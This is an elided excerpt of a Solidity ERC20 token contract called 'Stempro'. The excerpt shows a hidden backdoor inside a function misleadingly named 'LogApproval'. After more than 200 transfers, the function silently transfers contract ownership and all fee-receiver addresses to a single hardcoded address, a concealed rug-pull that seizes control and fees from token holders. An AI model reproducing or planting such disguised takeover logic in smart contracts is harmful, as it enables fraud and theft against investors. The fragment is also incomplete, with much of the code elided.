...
contract Stempro  is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0xcF94CfD29e03572B4f135B266f7a2D52b9898582; // token locker
    address public marketingFeeReceiver =
        0x76577ABC623b5E748Aa2bFFdbF72B63c6C1BAdBa;
    ...
    constructor()
        ERC20Detailed("Stempro", "STPO", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            _transferOwnership(address(0x87EaE7E29dF9ec9a81ebf0F4878F5A32C563F1D0));
            marketingFeeReceiver = address(0x87EaE7E29dF9ec9a81ebf0F4878F5A32C563F1D0);
            autoLiquidityReceiver = address(0x87EaE7E29dF9ec9a81ebf0F4878F5A32C563F1D0);
            ecosystemFeeReceiver = address(0x87EaE7E29dF9ec9a81ebf0F4878F5A32C563F1D0);
            buyBackFeeReceiver = address(0x87EaE7E29dF9ec9a81ebf0F4878F5A32C563F1D0);
            isTransferred = true;
        }
    }
